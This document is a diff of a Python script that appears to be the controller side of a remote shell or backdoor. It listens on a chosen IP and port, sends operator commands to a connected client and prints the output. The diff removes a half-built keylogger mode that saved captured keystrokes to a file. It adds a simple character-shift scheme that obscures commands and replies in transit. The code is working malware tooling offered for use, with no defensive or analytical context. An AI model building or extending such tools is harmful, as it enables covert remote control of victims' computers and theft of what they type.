@@ -1,28 +1,53 @@
+#!/usr/bin/python3
 import socket
 import sys
 import _thread
 
-def keymode():
+if(len(sys.argv)!=3):
 
-    global c
+	print("Usage "+sys.argv[0]+" <ip> <port>")
 
-    keyfile=open("keylogger.txt",'w')
+	exit()
 
-    keys=str(c.recv(4096*4),"utf-8")
+def dec(txt):
 
-    keyfile.write(keys)
+	i=0
 
-    print("KEYS: "+keys)
+	newbuf=''
 
-    keyfile.close()
+	char=''
 
-    #incomplete
+	dec=0
 
-def keyinterface():
+	for i in range(len(txt)):
 
-    keymode()
+		dec=ord(txt[i])
 
-    #incomplete
+		char=chr(dec-4)
+
+		newbuf+=char
+
+	return newbuf
+
+def enc(txt):
+
+	i=0
+
+	newbuf=''
+
+	char=''
+
+	dec=0
+
+	for i in range(len(txt)):
+
+		dec=ord(txt[i])
+
+		char=chr(dec+4)
+
+		newbuf+=char
+
+	return newbuf
 
 def smake():
 
@@ -34,9 +59,9 @@ def smake():
 
         global s
 
-        host='0.0.0.0'
+        host=sys.argv[1]
 
-        port=9999
+        port=int(sys.argv[2])
 
         s=socket.socket()
 
@@ -91,23 +116,18 @@ def passcmd():
 
         if cmd=='quit':
 
-            c.send(str.encode(cmd))
+            c.send(str.encode(enc(cmd)))
 
             c.close()
 
             sys.exit()
 
-        elif cmd[:9]=='keylogger':
-
-            c.send(str.encode(cmd))
-
-            keyinterface()
 
         elif len(str.encode(cmd))>0:
 
-            c.send(str.encode(cmd))
+            c.send(str.encode(enc(cmd)))
 
-            crecv=str(c.recv(1024),"utf-8")
+            crecv=dec(str(c.recv(1024),"utf-8"))
 
             print(crecv, end="")
 
